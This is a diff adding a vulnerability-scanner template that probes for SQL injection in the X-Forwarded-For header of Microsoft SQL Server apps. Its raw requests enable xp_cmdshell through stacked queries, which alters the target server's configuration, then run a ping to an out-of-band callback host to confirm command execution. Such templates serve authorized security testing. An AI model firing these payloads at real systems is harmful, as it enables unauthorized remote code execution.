@@ -1,0 +1,27 @@
+id: mssql-to-xff-rce-bypass
+
+info:
+  name: MSSQL injection via X-Forwarded-For to RCE
+  author: reewardius
+  severity: critical
+  reference: https://infosecwriteups.com/how-i-escalated-a-time-based-sql-injection-to-rce-bbf0d68cb398
+  tags: rce,generic
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        X-Forwarded-For: admin'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
+
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        X-Forwarded-For: '; EXEC xp_cmdshell 'ping {{interactsh-url}}';--
+        
+    stop-at-first-match: true
+    req-condition: true
+    matchers:
+      - type: dsl
+        dsl:
+          - contains(interactsh_protocol, 'http') || contains(interactsh_protocol, 'dns')
